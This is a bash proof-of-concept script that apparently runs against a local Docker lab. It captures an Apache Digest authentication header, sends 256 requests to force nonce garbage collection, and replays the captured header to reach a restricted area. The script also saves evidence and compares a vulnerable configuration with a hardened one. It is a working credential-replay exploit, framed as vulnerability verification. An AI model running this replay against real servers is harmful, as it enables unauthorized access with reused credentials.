#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${BASE_URL:-http://127.0.0.1:8080}"
SERVICE_NAME="${SERVICE_NAME:-target}"
DIGEST_USER="${DIGEST_USER:-digestuser}"
DIGEST_PASS="${DIGEST_PASS:-LabPass123}"
EVIDENCE_DIR="${EVIDENCE_DIR:-../report/evidence}"
LABEL="${LABEL:-digest-vulnerable}"
GC_COUNT="${GC_COUNT:-256}"
EXPECT_POST_STATUS="${EXPECT_POST_STATUS:-200}"

mkdir -p "$EVIDENCE_DIR"

echo "[*] Capturing valid Digest header from $BASE_URL..."
CAPTURE_STATUS=$(curl -sS -v --digest -u "$DIGEST_USER:$DIGEST_PASS" "$BASE_URL/digest/" \
  -o "$EVIDENCE_DIR/${LABEL}-initial-body.html" 2> "$EVIDENCE_DIR/${LABEL}-capture.txt" -w "%{http_code}")

if [ "$CAPTURE_STATUS" != "200" ]; then
  echo "[-] ERROR: Initial authenticated capture failed. Expected 200, got $CAPTURE_STATUS."
  exit 1
fi
echo "[+] Initial capture returned 200 OK."

AUTH="$(sed -n 's/^> \(Authorization: Digest .*\)$/\1/p' "$EVIDENCE_DIR/${LABEL}-capture.txt" | tail -n 1 | tr -d '\r')"
if [ -z "$AUTH" ]; then
  echo "[-] ERROR: No Digest Authorization header captured."
  exit 1
fi
printf '%s\n' "$AUTH" > "$EVIDENCE_DIR/${LABEL}-authorization.txt"

# Save active configuration
CONF_FILE="lab-vuln.conf"
if [ "$SERVICE_NAME" == "target-patched" ]; then CONF_FILE="lab-hardened.conf"; fi
docker exec "acw3-$SERVICE_NAME" grep -E "AuthDigestNonceLifetime|LogLevel" "/usr/local/apache2/conf/$CONF_FILE" > "$EVIDENCE_DIR/${LABEL}-active-config.txt" 2>/dev/null || true

echo "[*] Testing immediate negative control (Expecting 401)..."
CTL_STATUS=$(curl -sS -D "$EVIDENCE_DIR/${LABEL}-control-headers.txt" \
  -o "$EVIDENCE_DIR/${LABEL}-control-body.txt" -w '%{http_code}' \
  -H "$AUTH" "$BASE_URL/digest/")

if [ "$CTL_STATUS" != "401" ]; then
  echo "[-] ERROR: Negative control failed. Expected 401, got $CTL_STATUS. Setup invalid."
  exit 2
fi
echo "[+] Negative control returned 401."

echo "[*] Triggering client-entry garbage collection ($GC_COUNT requests)..."
# Capture start time for logs (using container time to ensure sync)
START_TIME=$(docker exec "acw3-$SERVICE_NAME" date -u +"%Y-%m-%dT%H:%M:%SZ")

for _ in $(seq 1 "$GC_COUNT"); do
  curl -sS -o /dev/null "$BASE_URL/digest/"
done

echo "[*] Verifying garbage collection occurred in logs..."
sleep 2
# Save full logs since START_TIME
docker logs --since "$START_TIME" "acw3-$SERVICE_NAME" > "$EVIDENCE_DIR/${LABEL}-full-target.log" 2>&1 || true
grep "gc'd" "$EVIDENCE_DIR/${LABEL}-full-target.log" > "$EVIDENCE_DIR/${LABEL}-gc.log" || true

if [ ! -s "$EVIDENCE_DIR/${LABEL}-gc.log" ]; then
    echo "[-] ERROR: Garbage collection was not detected in the server logs."
    exit 3
fi
echo "[+] Garbage collection confirmed in logs."

echo "[*] Replaying identical captured header (Expecting $EXPECT_POST_STATUS)..."
POST_STATUS=$(curl -sS -D "$EVIDENCE_DIR/${LABEL}-replay-headers.txt" \
  -o "$EVIDENCE_DIR/${LABEL}-replay-body.txt" -w '%{http_code}' \
  -H "$AUTH" "$BASE_URL/digest/")

echo "[+] Post-GC Replay Status: $POST_STATUS"

if [ "$POST_STATUS" = "$EXPECT_POST_STATUS" ]; then
  if [ "$EXPECT_POST_STATUS" = "200" ]; then
    if grep -qi 'ACW3 restricted area' "$EVIDENCE_DIR/${LABEL}-replay-body.txt"; then
       echo "[+] SUCCESS: Restricted content accessed via replayed credentials."
    else
       echo "[-] FAILURE: Replay returned 200 but restricted content marker is missing."
       exit 4
    fi
  else
    echo "[+] SUCCESS: Status matched expected $EXPECT_POST_STATUS."
  fi
else
  echo "[-] FAILURE: Expected $EXPECT_POST_STATUS, but got $POST_STATUS."
  exit 5
fi
